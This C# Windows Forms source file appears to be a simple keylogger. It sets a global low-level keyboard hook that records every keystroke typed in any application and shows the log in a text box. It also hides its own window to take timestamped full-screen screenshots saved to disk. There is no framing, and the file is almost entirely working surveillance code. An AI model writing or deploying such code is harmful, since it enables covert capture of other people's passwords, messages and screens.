using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Drawing.Imaging;

namespace WindowsFormsApp8

{


    public partial class Form1 : Form
    {
        public static String text;

        public Form1()
        {

            InitializeComponent();
        }



        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;


        private static IntPtr SetHook(LowLevelKeyboardProc proc)

        {

            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule)

            {

                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,

                    GetModuleHandle(curModule.ModuleName), 0);

            }

        }


        private delegate IntPtr LowLevelKeyboardProc(

            int nCode, IntPtr wParam, IntPtr lParam);


        private static IntPtr HookCallback(

            int nCode, IntPtr wParam, IntPtr lParam)

        {

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)

            {

                int vkCode = Marshal.ReadInt32(lParam);

                Console.WriteLine((Keys)vkCode);
                text += (Keys)vkCode + " ";

            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);

        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr SetWindowsHookEx(int idHook,

            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        [return: MarshalAs(UnmanagedType.Bool)]

        private static extern bool UnhookWindowsHookEx(IntPtr hhk);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,

            IntPtr wParam, IntPtr lParam);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr GetModuleHandle(string lpModuleName);



        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = text;
            text = "";
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            _hookID = SetHook(_proc);
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
                this.WindowState = FormWindowState.Normal;
            this.Activate();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //FindForm().Hide();
            FindForm().Hide();
            timer1.Start();

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Graphics graph = null;
            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            graph = Graphics.FromImage(bmp);
            string date = System.DateTime.Now.ToString().Replace(".", "-");
            date = date.Replace(":", "-");
            date = date.Replace(" ", "-");
            string filename = "wtf" + date + ".bmp";
            graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            graph.FillRectangle(new SolidBrush(Color.Black), new RectangleF((Screen.PrimaryScreen.Bounds.Width - 200), (Screen.PrimaryScreen.Bounds.Height - 30), 180, 25));
            graph.DrawString(date.ToString(),
        new System.Drawing.Font("Calibri", 15, FontStyle.Bold),
        new SolidBrush(Color.White), new RectangleF((Screen.PrimaryScreen.Bounds.Width - 200), (Screen.PrimaryScreen.Bounds.Height - 30), 0, 50),
        new StringFormat(StringFormatFlags.NoWrap));
            bmp.Save(filename);
            FindForm().Show();
            timer1.Stop();
        }


    }


}